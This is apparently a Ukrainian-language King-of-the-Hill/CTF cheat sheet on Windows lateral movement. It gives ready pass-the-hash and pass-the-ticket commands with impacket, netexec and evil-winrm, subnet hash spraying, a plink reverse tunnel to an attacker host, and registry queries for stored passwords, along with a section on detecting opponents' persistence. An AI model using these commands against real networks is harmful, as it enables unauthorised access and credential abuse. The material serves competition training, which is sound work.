# Windows: Lateral Movement & Post-Exploitation

**Навіщо:** є креди/хеш/квиток — розширити доступ на інші хости й акаунти (де нові прапорці), зібрати післяексплуатаційний enum, а в KotH — **виявити чужу активність/закладки** суперників.
**Коли:** здобуто креденшл (plaintext / NT-хеш / Kerberos-квиток).
← [README](README.md) · [credentials](04-credentials.md) · [AD](05-active-directory.md) · [pivoting](../02-workflows/pivoting-portforward.md)

> **Правила KotH:** не ламати/видаляти сервіси, не атакувати чужі IP із захопленої машини, без власної персистенції-закладок. Розділ «персистенція» тут — **лише для виявлення чужої**, не для встановлення своєї.

---

## 1. Pass-the-Hash (NT-хеш замість пароля) <a id="pass-the-hash"></a>
**Коли:** здобув NT-хеш (SAM/secretsdump/LSASS), пароль невідомий. Локальний Administrator-хеш часто спільний на кількох хостах.
```bash
netexec smb $TARGET -u Administrator -H <NThash>            # перевірка (додасть Pwn3d! якщо адмін)
netexec smb 10.0.N0.0/24 -u Administrator -H <NThash>       # spray хеша по підмережі
evil-winrm -i $TARGET -u Administrator -H <NThash>          # shell по WinRM
impacket-psexec -hashes :<NThash> Administrator@$TARGET     # SYSTEM через ADMIN$
impacket-wmiexec -hashes :<NThash> Administrator@$TARGET    # тихіше
```
**Інтерпретація:** `Pwn3d!` у netexec → ти локальний адмін на тому хості.
**Обмеження:** PtH по SMB/WinRM блокується, якщо для локальних акаунтів діє **LocalAccountTokenFilterPolicy=0** (не-RID500) — тоді працюй RID-500 Administrator або доменним акаунтом. NetNTLMv2 **не** можна передавати (тільки крек).

## 2. Pass-the-Ticket (Kerberos) <a id="pass-the-ticket"></a>
> *Статус: команди — стандартний синтаксис impacket (документально), **конкретну лабораторію в аудиті не пінено**; перевіряй FQDN/час на місці.*

**Коли:** є `.ccache`/`.kirbi` квиток (з LSASS, з AS-REP/TGS, або створений).
```bash
export KRB5CCNAME=/path/ticket.ccache
impacket-psexec -k -no-pass $DOMAIN/<user>@$DCHOST          # -k = Kerberos auth
netexec smb $TARGET -k --use-kcache
# з NT-хеша отримати TGT:
impacket-getTGT $DOMAIN/<user> -hashes :<NThash>
```
**Обмеження:** звертатись треба за **FQDN** (не IP) — Kerberos прив'язаний до імен; годинник синхронізований ([AD](05-active-directory.md)).

## 3. Канали виконання (що обрати)
| Інструмент | Порт | Контекст | Нюанс |
|---|---|---|---|
| `evil-winrm` | 5985/5986 | shell юзера | найзручніший; потрібна група Remote Management Users |
| `impacket-psexec` | 445 | **SYSTEM** | гучний (створює сервіс), лишає слід у логах |
| `impacket-wmiexec` | 135+445 | юзер | напів-інтерактивний, тихіший |
| `impacket-smbexec` | 445 | SYSTEM | без завантаження бінаря |
| `impacket-atexec` | 445 | через schtasks | коли інше закрито |
| `xfreerdp` | 3389 | GUI | `/dynamic-resolution /cert:ignore` |
| `RunasCs.exe` | локально | інший юзер | коли вже на хості й є пароль/хеш |
```bash
evil-winrm -i $TARGET -u <user> -p <pass>
impacket-wmiexec $DOMAIN/<user>:<pass>@$TARGET
xfreerdp /d:$DOMAIN /u:<user> /p:<pass> /v:$TARGET /cert:ignore /dynamic-resolution
```

## 4. Lateral recon зсередини (куди рухатись)
```cmd
:: з якими хостами спілкується цей вузол
arp -a & net view & net view /domain
:: куди в мене вже є збережений доступ
cmdkey /list & net use
:: сусіди в підмережі (PS)
powershell -c "1..254|%{$i='10.0.N0.'+$_;if(Test-Connection $i -Count 1 -Quiet){$i}}"
```
Внутрішні сервіси лише на localhost → pivot на Kali (plink.exe / chisel): [pivoting](../02-workflows/pivoting-portforward.md).
```cmd
:: plink reverse tunnel (внутрішній 3306 цілі → Kali:13306)
plink.exe -ssh -R 13306:127.0.0.1:3306 kali@10.8.N.x -pw <pass> -N
```

## 5. Post-exploitation enum (після нового доступу — повторити)
```cmd
whoami /all & hostname
net user & net localgroup administrators
:: нові джерела кредів на цьому хості → [credentials]
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i password
:: flag-hunt (див. cheatsheet)
```
Кожен **новий хост/юзер** = ймовірно нові креди й новий прапорець → цикл: enum → creds → lateral.

## 6. Виявлення чужого доступу / персистенції (KotH-оборона, НЕ встановлення своєї)
**Навіщо:** суперники могли залишити доступ на спільній машині. Виявити (і за правилами — закрити вектор, не ламаючи сервіс → [patching-defense](../patching/README.md)).
```cmd
:: підозрілі локальні адміни / нові юзери
net localgroup administrators & net user
:: автозапуски
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
wmic startup get Caption,Command
:: свіжі/підозрілі scheduled tasks
schtasks /query /fo LIST /v | findstr /i "Author Task-To-Run Next-Run"
:: нові сервіси з дивним binpath
wmic service get Name,PathName,StartName | findstr /i /v "C:\Windows"
:: активні сесії/слухаючі порти (чужий listener?)
query user & netstat -ano | findstr LISTENING
:: нещодавно змінені файли (під час раунду)
powershell -c "gci C:\ -Recurse -EA 0|?{$_.LastWriteTime -gt (Get-Date).AddHours(-2)}|select FullName,LastWriteTime"
```
**Інтерпретація:** новий адмін-юзер / Run-ключ / сервіс із binpath у `C:\temp` / чужий listener → слід суперника. Дія за правилами: змінити пароль, прибрати **залитий чужий** артефакт (не системний файл/не прапорець), закрити вектор входу.
**Обмеження:** не видаляй нічого, у чому не впевнений (бан за деструктив); фіксуй «що знайшов → як закрив» для організаторів.

## Часті помилки
- Не спробувати локальний Administrator-хеш на інших хостах (втрата половини мережі).
- psexec там, де досить wmiexec/winrm (зайвий шум/сліди).
- Kerberos по IP замість FQDN → `KRB_AP_ERR` без причини.
- Після нового доступу не повторити enum/flag-hunt.

## Джерела
- HackTricks — Lateral Movement / Pass-the-Hash: https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html
- HackTricks — Pass the Ticket: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.html
- impacket (psexec/wmiexec/smbexec): https://github.com/fortra/impacket
- MITRE ATT&CK — Lateral Movement (TA0008): https://attack.mitre.org/tactics/TA0008/
